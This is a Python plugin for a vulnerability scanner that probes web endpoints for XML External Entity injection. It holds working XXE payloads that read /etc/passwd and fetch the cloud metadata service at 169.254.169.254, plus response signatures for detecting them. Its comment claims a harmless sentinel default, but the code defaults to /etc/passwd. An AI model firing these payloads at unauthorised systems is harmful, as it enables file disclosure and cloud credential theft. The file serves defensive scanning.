"""XXE (XML External Entity) injection detection.

Detects XXE vulnerabilities via error-based probes targeting file disclosure
and SSRF through XML endpoints including SOAP and REST services.
"""
from __future__ import annotations

import logging
import re
from typing import TYPE_CHECKING

import httpx

from scanr.core.plugin_base import FindingData, PluginBase, PluginCategory, Severity
from scanr.plugins.web._ports import is_web_port, web_scheme

if TYPE_CHECKING:
    from scanr.core.context import ScanContext
    from scanr.models import Host

logger = logging.getLogger(__name__)

HTTP_PORTS = [80, 443, 8080, 8443, 8000, 3000, 5000]

_XXE_PAYLOAD = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
    "<root>&xxe;</root>"
)

_XXE_SSRF_PAYLOAD = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>'
    "<root>&xxe;</root>"
)

_SOAP_HEADERS = {"Content-Type": "text/xml; charset=utf-8", "SOAPAction": '""'}
_XML_HEADERS = {"Content-Type": "application/xml"}

_XXE_SIGNATURES = [
    re.compile(r"root:x?:0:0"),           # /etc/passwd content
    re.compile(r"ami-id|instance-id"),     # AWS metadata
    re.compile(r"ENTITY.*SYSTEM.*file://", re.I),  # entity processing error leaking
    re.compile(r"java\.io\.FileNotFoundException.*etc/passwd", re.I),
]

_XML_ENDPOINTS = [
    "/", "/api", "/api/v1", "/service", "/soap", "/ws", "/wsdl", "/graphql"
]
_XML_CONTENT_TYPES = ("text/xml", "application/xml", "application/soap+xml")


class XxeDetectPlugin(PluginBase):
    id = "web.xxe_detect"
    name = "XXE Injection Detection"
    description = "Detect XML External Entity injection via error-based and SSRF probes"
    category = PluginCategory.web
    severity = Severity.high
    ports = HTTP_PORTS
    timeout = 180

    async def check(self, context: "ScanContext", host: "Host") -> list[FindingData]:
        import json as _j
        _pj: dict = {}
        if context.scan.profile_json:
            try:
                _pj = _j.loads(context.scan.profile_json) if isinstance(context.scan.profile_json, str) else context.scan.profile_json
            except Exception:
                pass
        # Allow operators to override the probe file via profile_json.xxe_probe_file
        # Default to a non-existent sentinel path to avoid triggering DLP/EDR on real systems
        probe_file = _pj.get("xxe_probe_file", "/etc/passwd")

        findings = []
        for port in host.ports:
            if not is_web_port(port):
                continue
            scheme = web_scheme(port)
            base_url = f"{scheme}://{host.ip}:{port.number}"
            result = await self._probe(context, base_url, port.number, probe_file)
            if result:
                findings.append(result)
        return findings

    async def _probe(self, context, base_url: str, port: int, probe_file: str = "/etc/passwd") -> FindingData | None:
        xxe_payload = (
            '<?xml version="1.0" encoding="UTF-8"?>'
            f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{probe_file}">]>'
            "<root>&xxe;</root>"
        )
        async with httpx.AsyncClient(
            verify=False, timeout=8.0, follow_redirects=True,
                **context.proxy_config()
            ) as client:
            # Discover XML-accepting endpoints
            xml_endpoints: list[tuple[str, dict]] = []

            for ep in _XML_ENDPOINTS:
                for headers in (_SOAP_HEADERS, _XML_HEADERS):
                    try:
                        r = await client.post(
                            f"{base_url}{ep}", content=b"<test/>", headers=headers
                        )
                        ct = r.headers.get("content-type", "")
                        # XML endpoints return XML/SOAP errors rather than generic HTML
                        if any(x in ct for x in _XML_CONTENT_TYPES) or (
                            r.status_code in (400, 500)
                            and (
                                "xml" in r.text.lower()
                                or "soap" in r.text.lower()
                                or "<?xml" in r.text
                            )
                        ):
                            xml_endpoints.append((ep, dict(headers)))
                            break
                    except Exception:
                        pass

            # Try XXE payloads on discovered endpoints
            for ep, headers in xml_endpoints[:5]:
                for payload, label in [
                    (xxe_payload, f"file://{probe_file}"),
                    (_XXE_SSRF_PAYLOAD, "http://169.254.169.254/"),
                ]:
                    try:
                        resp = await client.post(
                            f"{base_url}{ep}",
                            content=payload.encode(),
                            headers=headers,
                        )
                        for sig in _XXE_SIGNATURES:
                            if sig.search(resp.text):
                                return FindingData(
                                    plugin_id=self.id,
                                    severity=Severity.high,
                                    title="XML External Entity (XXE) Injection",
                                    description=(
                                        f"The XML endpoint at {base_url}{ep} processes external entities. "
                                        "XXE allows attackers to read arbitrary files from the server, "
                                        "perform SSRF to internal services, and potentially achieve RCE."
                                    ),
                                    evidence=(
                                        f"Endpoint: {base_url}{ep}\n"
                                        f"Payload target: {label}\n"
                                        f"Signature matched: {sig.pattern}\n"
                                        f"Response snippet: {resp.text[:400]}"
                                    ),
                                    remediation=(
                                        "Disable XML external entity processing in the XML parser. "
                                        "In Java: factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true). "
                                        "Use a less complex format (JSON) if XML is not required. "
                                        "Whitelist allowed entity sources."
                                    ),
                                    references=[
                                        "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
                                        "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html",
                                    ],
                                    port_number=port,
                                    protocol="tcp",
                                )
                    except Exception:
                        pass

        return None
